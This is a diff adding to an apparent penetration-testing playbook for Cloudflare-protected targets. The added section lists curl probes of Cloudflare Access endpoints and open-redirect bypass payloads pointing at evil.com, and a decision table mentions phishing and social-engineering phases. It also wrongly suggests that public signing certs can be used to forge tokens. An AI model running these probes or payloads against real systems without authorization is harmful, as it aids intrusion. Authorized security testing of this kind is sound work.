@@ -117,6 +117,51 @@ location: https://target.cloudflareaccess.com/cdn-cgi/access/login/target.com?..
 - JWT contains identity claims — decode to understand access model
 - Sometimes misconfigured: try accessing with `CF_Authorization` cookie from another app in same org
 
+#### CF Access Endpoint Testing (MANDATORY)
+
+Even when the origin is gated, always test CF Access's own endpoints:
+
+```bash
+# 1. Open Redirect on logout (patched in CF version 20-df9b4f3, but test anyway)
+curl -sI "https://target.com/cdn-cgi/access/logout?returnTo=http://evil.com"
+# Vulnerable: 302 → http://evil.com
+# Patched: 400 "Invalid redirect URL" or 200 "No Access cookie found"
+
+# 2. Identity leak (requires valid CF_Authorization cookie)
+curl -s "https://target.com/cdn-cgi/access/get-identity" -H "Cookie: CF_Authorization=<jwt>"
+# May leak: email, name, groups, IdP metadata
+
+# 3. Public certs (always accessible, reveals Access policy config)
+curl -s "https://target.com/cdn-cgi/access/certs"
+# Returns JWT signing keys — use to validate/forge CF_Authorization tokens
+
+# 4. Login endpoint enumeration
+curl -sI "https://target.com/cdn-cgi/access/login"
+# Reveals configured IdP (Google, Okta, Azure AD, etc.)
+
+# 5. Authorized endpoint (session validation)
+curl -s "https://target.com/cdn-cgi/access/authorized"
+# 400/401 without cookie, 200 with valid cookie — confirms access policy exists
+```
+
+**Open redirect bypass attempts** (if returnTo returns 400 "Invalid redirect URL"):
+```bash
+# Parameter case variations (CF only recognizes `returnTo` camelCase)
+?ReturnTo=http://evil.com    # Ignored (200, no redirect)
+?returnTo=http://evil.com    # Processed (400 = validated and blocked)
+?return_to=http://evil.com   # Ignored (200, no redirect)
+
+# URL validation bypasses to try:
+?returnTo=//evil.com
+?returnTo=http://target.com@evil.com
+?returnTo=http://evil.com%23.target.com
+?returnTo=https://target.com.evil.com
+?returnTo=http:\\evil.com
+?returnTo=http:/evil.com
+```
+
+**Key insight:** If `returnTo` returns 400 but `ReturnTo` returns 200, CF is processing the parameter but blocking it. The redirect was patched ~2024. On older CF versions (pre-20-df9b4f3), this was a valid open redirect.
+
 ### CF IP Allowlist (Access Policy: IP-based)
 
 ```
@@ -212,10 +257,12 @@ curl https://target.com/cdn-cgi/trace
 |----------|----------|--------|
 | IP Allowlist, no origin found | Identical 403 on all paths/methods, no historical DNS, no leaked origin | **STOP** — document finding, move on |
 | API Shield, no creds | MISSING_API_TOKEN, no token source identified | **STOP** — note for social engineering phase |
-| Zero Trust, no identity | CF Access login, no valid identity provider access | **STOP** — note for phishing/social eng |
+| Zero Trust, no identity | CF Access login, no valid identity provider access | **TEST CF ENDPOINTS FIRST** then STOP |
 | WAF blocking, origin unknown | Challenges on all requests, no bypass after 30min | **DEPRIORITIZE** — try origin discovery |
 | WAF blocking, origin found | Have origin IP | **BYPASS** — hit origin directly |
 | Worker filtering | Worker-specific errors | **PROBE** — method/path enumeration (15min timebox) |
+
+**IMPORTANT:** "Zero Trust = STOP" does NOT mean skip the host entirely. Always test `/cdn-cgi/access/*` endpoints (logout open redirect, certs leak, identity leak) before marking as untestable. The gate itself is attack surface.
 
 ### Bank Jago Decision Flow
 
